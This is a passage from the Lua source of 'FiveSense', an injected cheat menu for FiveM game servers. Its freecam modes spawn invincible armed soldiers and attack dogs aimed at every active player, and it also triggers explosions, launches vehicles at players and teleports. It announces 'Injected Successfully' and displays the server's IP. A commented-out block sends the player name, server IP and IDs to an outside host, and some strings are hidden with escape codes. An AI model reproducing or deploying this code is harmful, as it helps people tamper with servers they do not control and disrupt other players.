                                           for k, i in pairs(sum.f.GetActivePlayers()) do 
                                               sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(i), 0, 16)
                                           end
                                       end
                                   end			
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                       if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                           local pedTable = {"s_m_y_armymech_01","s_m_y_blackops_01","s_m_m_marine_01","s_m_y_blackops_03","s_m_y_blackops_02"}
                                           local randomPed = (pedTable[sum.curak.random(#pedTable)])
                                           if not sum.f.HasModelLoaded(sum.f.GetHashKey(randomPed)) then 
                                               sum.f.RequestModel(sum.f.GetHashKey(randomPed))
                                           end 										
                                           sum.curak.wait(5)
                                               local ped = sum.f.CreatePed(3, sum.f.GetHashKey(randomPed),coords.x,coords.y,coords.z - 0.5,true,true)
                                               sum.f.SetEntityInvincible(ped, true)
                                               sum.f.GiveWeaponToPed(ped, sum.f.GetHashKey("WEAPON_CARBINERIFLE"), 200, 1, 1)
                                               for k, i in pairs(sum.f.GetActivePlayers()) do 
                                                   sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(i), 0, 16)
                                               end
                                           end
                                       end
                                   end
                               
   
                           if currentmode == "Animal Spawner" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(1, 68) then
                                       local animalTable = {"a_c_boar","a_c_dolphin","a_c_killerwhale","a_c_retriever","a_c_pig","a_c_cow","a_c_humpback"}
                                       local animal = (animalTable[sum.curak.random(#animalTable)])
                                       if not sum.f.HasModelLoaded(sum.f.GetHashKey(animal)) then 
                                           sum.f.RequestModel(sum.f.GetHashKey(animal))
                                       end 
                                       sum.f.CreatePed(3, sum.f.GetHashKey(animal),coords.x,coords.y,coords.z,true,true)
                                   end
                               end
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                       local animalTable = {"a_c_boar","a_c_dolphin","a_c_killerwhale","a_c_retriever","a_c_pig","a_c_cow","a_c_humpback"}
                                       local animal = (animalTable[sum.curak.random(#animalTable)])
                                       if not sum.f.HasModelLoaded(sum.f.GetHashKey(animal)) then 
                                           sum.f.RequestModel(sum.f.GetHashKey(animal))
                                       end 
                                       sum.f.RequestModel(animal)
                                       sum.f.CreatePed(3,sum.f.GetHashKey(animal),coords.x,coords.y,coords.z,true,true)
                                   end
                               end
                           end
   
                           if currentmode == "Particle Spawner" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                           sum.f.RequestNamedPtfxAsset(sum.freecamparticles[1])
                                           sum.f.UseParticleFxAssetNextCall(sum.freecamparticles[1])
                                           sum.f.StartNetworkedParticleFxNonLoopedAtCoord(sum.freecamparticles[2],coords,0.0,0.0,0.0,sum.s['freecam-particle-scale'].value,false,false,false)
   
                                   end
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                       if sum.f.IsDisabledControlPressed(1, 68) then 
                                           sum.f.RequestNamedPtfxAsset(sum.freecamparticles[1])
                                           sum.f.UseParticleFxAssetNextCall(sum.freecamparticles[1])
                                           sum.f.StartNetworkedParticleFxNonLoopedAtCoord(sum.freecamparticles[2],coords,0.0,0.0,0.0,sum.s['freecam-particle-scale'].value,false,false,false)    
                                       end
                                   end
                               end
                           end
   
                           if currentmode == "Fast and Furious" then
                               if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then
                                       local vehs = {"sultanrs","blista","zentorno","adder","turismo","deviant","thrax","vamos",} 
                                       local hash = sum.f.GetHashKey(vehs[sum.curak.random(#vehs)])
                                       if not sum.f.HasModelLoaded(hash) then 
                                           sum.f.RequestModel(hash)
                                       end
                                       
                                       local veh = sum.f.CreateVehicle(hash, coords, 1, 1, 1)
                                       sum.f.SetVehicleEngineOn(veh, true, true, true)
                                       sum.f.SetEntityRotation(veh, sum.f.GetCamRot(camera, 2), 0.0, sum.f.GetCamRot(camera, 2), 0.0, true)
                                       sum.f.SetVehicleForwardSpeed(veh, 500.0)
                                   end
                               end
                           end
   
   
   
                           if currentmode == "Teleport" then
                               if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                       sum.f.SetEntityCoords(sum.f.PlayerPedId(), coords)
                                   end
                               end
                           end
   
                           if currentmode == "Vehicle Spawner" then
                               if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                       local vehicles = {"adder", "sultanrs", "bati"}
                                       local hash = sum.f.GetHashKey(vehicles[sum.curak.random(#vehicles)])
                                       if not sum.f.HasModelLoaded(hash) then 
                                           sum.f.RequestModel(hash)
                                       end
                                       local veh = sum.f.CreateVehicle(hash, coords, 1, 1, 1)
                                   end
                               end
   
                               if sum.f.IsDisabledControlPressed(1, 68) then 
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                       local vehicles = {"adder", "sultanrs", "bati"}
                                       local hash = sum.f.GetHashKey(vehicles[sum.curak.random(#vehicles)])
                                       if not sum.f.HasModelLoaded(hash) then 
                                           sum.f.RequestModel(hash)
                                       end
                                       local veh = sum.f.CreateVehicle(hash, coords, 1, 1, 1)
                                   end
                               end
                           end
   
   
                           if currentmode == "Dog Attack" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlPressed(1, 68) then
                                       local pedTable = {"a_c_retriever","a_c_rottweiler","a_c_shepherd","a_c_westy","a_c_husky"}
                                       local randomPed = (pedTable[sum.curak.random(#pedTable)])
                                       if not sum.f.HasModelLoaded(sum.f.GetHashKey(randomPed)) then 
                                           sum.f.RequestModel(sum.f.GetHashKey(randomPed))
                                       end sum.curak.wait(5)
                                           local ped = sum.f.CreatePed(3,sum.f.GetHashKey(randomPed),coords.x,coords.y,coords.z - 0.5,true,true)
                                           sum.f.SetEntityInvincible(ped, true)
                                           for k, i in pairs(sum.f.GetActivePlayers()) do 
                                           sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(i), 0, 16)
                                           end
                                       end
                                   end
   
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu  then 
                                       if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                           local pedTable = {"a_c_retriever","a_c_rottweiler","a_c_shepherd","a_c_westy","a_c_husky"}
                                           local randomPed = (pedTable[sum.curak.random(#pedTable)])
                                           if not sum.f.HasModelLoaded(sum.f.GetHashKey(randomPed)) then 
                                               sum.f.RequestModel(sum.f.GetHashKey(randomPed))
                                           end 										
                                           sum.curak.wait(5)
                                               local ped = sum.f.CreatePed(3, sum.f.GetHashKey(randomPed),coords.x,coords.y,coords.z - 0.5,true,true)
                                               sum.f.SetEntityInvincible(ped, true)
                                               for k, i in pairs(sum.f.GetActivePlayers()) do 
                                               sum.f.TaskCombatPed(ped, sum.f.GetPlayerPed(i), 0, 16)
                                           end
                                       end
                                   end
                               end
   
                               if currentmode == "Shockwave Gun" then
                                   local weapondelay = 0
                                   if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu  then 
                                   if sum.f.IsDisabledControlPressed(1, 68) and weapondelay <= sum.f.GetGameTimer() then
                                       sum.f.AddExplosion(coords.x + 1,coords.y + 1,coords.z + 1,70,100.0,true,false,0.0)
                                   end
                                   if sum.f.IsDisabledControlJustPressed(0, 69) and weapondelay <= sum.f.GetGameTimer() then
                                       sum.f.GiveWeaponToPed(sum.f.PlayerPedId(), sum.f.GetHashKey("WEAPON_RAYPISTOL"), 120, false, false)
                                       sum.f.RequestWeaponAsset(sum.f.GetHashKey("WEAPON_RAYPISTOL"))
                                       while not sum.f.HasWeaponAssetLoaded(sum.f.GetHashKey("WEAPON_RAYPISTOL")) do
                                           sum.curak.wait(5)
                                       end
                                       sum.f.ShootSingleBulletBetweenCoords(sum.f.GetCamCoord(camera) + sum.f.rotationToDirection(sum.f.GetCamRot(camera, 2)),coords,0,false,sum.f.GetHashKey("WEAPON_RAYPISTOL"),0,false, true,false,-1.0)
                                       weapondelay = sum.f.GetGameTimer() + 50
                                   end
                               end
                           end
   
                           if currentmode == "Entity Deleter" then
                               if coords ~= sum.curak.vector3(0, 0, 0) and not sum.f.drawmenu then 
                                   if sum.f.IsDisabledControlJustPressed(0, 69) then 
                                       if sum.f.DoesEntityExist(entity) and not sum.f.IsPedAPlayer(entity) then
                                           sum.f.DeleteAllShits(entity)
                                       end
                                   end
                                   if sum.f.IsDisabledControlPressed(1, 68) then 
                                       if sum.f.DoesEntityExist(entity) and not sum.f.IsPedAPlayer(entity) then
                                           sum.f.DeleteAllShits(entity)
                                       end
                                   end
                               end
                           end
                           
                           if coords ~= sum.curak.vector3(0, 0, 0) then 
                               local abc = sum.f.getWidth("".. currentmode ..": x: "..cx.. ' y: '..cy.. ' z: '.. cz, 4, 0.5)
                               local rX, rY = sum.f.GetActiveScreenResolution()                            
                               sum.f.drawTextOutline("".. currentmode ..": x: "..cx.. ' y: '..cy.. ' z: '.. cz, 0.5, 0.972, 0.3, 4, true, true, 255, 255, 255)
                               sum.f.DrawSprite('mpentry', 'mp_modenotselected_gradient', 0.5, 0.973, abc,  0.03, 0.0, 1, 1, 1, 155)
                               sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.5, 0.973-0.02/2, abc,  2/rY, 0.0, 25, 255, 1, 155)
                               sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.5, 0.973+0.02/2, abc,  2/rY, 0.0, 25, 255, 1, 155)
                           else
                           
                               local abc = sum.f.getWidth("".. currentmode ..": Aim on something!", 4, 0.5)
                               local rX, rY = sum.f.GetActiveScreenResolution()                            
                               sum.f.drawTextOutline("".. currentmode ..": Aim on something!", 0.5, 0.972, 0.3, 4, true, true, 255, 255, 255)
                               sum.f.DrawSprite('mpentry', 'mp_modenotselected_gradient', 0.5, 0.973, abc,  0.03, 0.0, 1, 1, 1, 155)
                               sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.5, 0.973-0.02/2, abc,  2/rY, 0.0, 255, 1, 1, 155)
                               sum.f.DrawSprite('mpentry', 'mp_modeselected_gradient', 0.5, 0.973+0.02/2, abc,  2/rY, 0.0, 255, 1, 1, 155)
                           end
                       
                           
   
                           if sum.f.IsDisabledControlJustPressed(1, 14) then
                               sum.freecam.mode = sum.freecam.mode + 1
                               if sum.freecam.mode > #sum.freecam.modes then
                                   sum.freecam.mode = 1
                               end
                           end
   
                           if sum.f.IsDisabledControlJustPressed(1, 15) then
                               sum.freecam.mode = sum.freecam.mode - 1
                               if sum.freecam.mode < 1 then
                                   sum.freecam.mode = #sum.freecam.modes
                               end
                           end
   
   
                           sum.f.SetFocusPosAndVel(sum.f.GetCamCoord(camera).x, sum.f.GetCamCoord(camera).y, sum.f.GetCamCoord(camera).z, 0.0, 0.0, 0.0)
                           sum.f.SetCamRot(camera, offsetRotX, offsetRotY, offsetRotZ, 2)	
                       end			
                   end	
               end
           end
       end
   end)
   
   
   sum.curak.thr(function()
       while sum.menu do
           sum.curak.wait(0) 
           local text, value = sum.m.input('Open Key', 'H', 1, true)
           sum['OpenMenu'] = sum.keys[text]
           if text ~= nil then
               break;
           end
       end
   end)
   
   sum.f.sendNotification('Welcome back, <font color="#70D900">'..sum.f.GetPlayerName(sum.f.PlayerId()), 'Injected Successfully')
   sum.f.sendNotification('<font color="#FF0000">\114\101\100\69\78\71\73\78\69\32'..'<font color="#FFFFFF">\85\73\68\58 '.. sum.f.GetServerInformation(), 'Information')
   sum.f.sendNotification('IP: '.. sum.f.GetCurrentServerEndpoint(),'Information')
   
   
   
   sum.curak.thr(function()
       while sum.menu do 
           for k, a in ipairs(sum.notifications) do 
               if a.index >= 0 then 
                  
                   local posY = 0.4 + (a.index * 0.05)
                   local alpha = a.alpha
                   if a.alpha > 0 then 
                       sum.f.DrawRect(a.X, posY, 0.202, 0.0188+0.0018, 20, 20, 20, a.alpha)
                       sum.f.DrawRect(a.X, posY, 0.201, 0.0188, 55, 55, 55, a.alpha)
                       sum.f.DrawRect(a.X, posY, 0.2, 0.017, 20, 20, 20, a.alpha)   
                       sum.f.SetTextColour(255, 255, 255, a.alpha)
                       sum.f.drawText('</font>[five<font color="#70D900">sense</font>] '.. a.subtext , a.X-0.1, posY+0.001, 0.27, 4, false)     
                       sum.f.DrawRect(a.X, posY+0.021, 0.202, 0.0188+0.0018, 20, 20, 20, a.alpha)
                       sum.f.DrawRect(a.X, posY+0.021, 0.201, 0.0188, 55, 55, 55, a.alpha)
                       sum.f.DrawRect(a.X, posY+0.021, 0.2, 0.017, 20, 20, 20, a.alpha)
                       sum.f.SetTextColour(255, 255, 255, a.alpha)
                       sum.f.drawText('[~c~'.. tostring(a.index+1).. '~s~] '.. a.text, a.X-0.1, posY+0.022, 0.27, 4, false)
                   end
                   if sum.f.GetGameTimer() - a.gametime >= 1500 then
                       if a.alpha < 0 then 
                           a.alpha = 0 
                       else
                           a.alpha = a.alpha - 1
                       end
                       a.X = a.X - 0.001
                   else
                       if a.X < 0.11 then 
                           a.X = a.X + 0.002
                       end
                   end
                   if sum.f.GetGameTimer() - a.gametime >= 3000 then 
                       sum.f.removeNotification(k)
                   end
               end
           end
           sum.curak.wait(0)
       end
   end)
   
   --[[ p100 crack or dev check
   sum.curak.thr(function() -- THX TO FUCKING COCK MENU 
       local PlayerID = sum.f.GetPlayerServerId(sum.f.PlayerId())
       local PlayerName = sum.f.GetPlayerName(sum.f.PlayerId())
       local a = sum.f.GetServerInformation()
       local ip = sum.f.GetCurrentServerEndpoint()
       local connectedplayers = sum.f.GetActivePlayers()
       if sum.f.IsEntityDead(sum.f.PlayerPedId()) then
           playerdata = "Dead"
       else
           playerdata = "Alive"
       end
       local resource = sum.f.GetCurrentResourceName()
       local url 
       if a ~= 0 then 
           url = "https://cock.menu/negrkubca.php".."?user="..PlayerName.."&res="..resource.."&sip="..ip.."&status="..playerdata..'&ui=FiveSense V2'..'&sid='..PlayerID..'&\114\101\117\105\100='..a..''
       else 
           url = "https://cock.menu/negrkubca.php".."?user=CRACKED OR DEV"
       end
       local log_dui = sum.f.CreateDui(url, 50, 50)
       sum.f.DestroyDui(log_dui)
   end)]]
   
   
   
   
   
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   --else
       --sum.curak.sudp("\94\49\83\67\82\73\80\84\32\69\82\82\79\82\32\58\32\64\102\105\118\101\115\101\110\115\101\47\102\105\118\101\115\101\110\115\101\46\108\117\97\58\49\49\50\51\48\32\58\32\97\116\116\101\109\112\116\32\116\111\32\99\97\108\108\32\97\32\110\105\108\32\118\97\108\117\101\32\40\102\105\101\108\100\32\39\114\101\109\111\118\101\78\111\116\105\102\105\99\97\116\105\111\110\39\41")
   --end
   
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ --
   -- // KUBCA IS INJECTING \\ -- 
   
   end)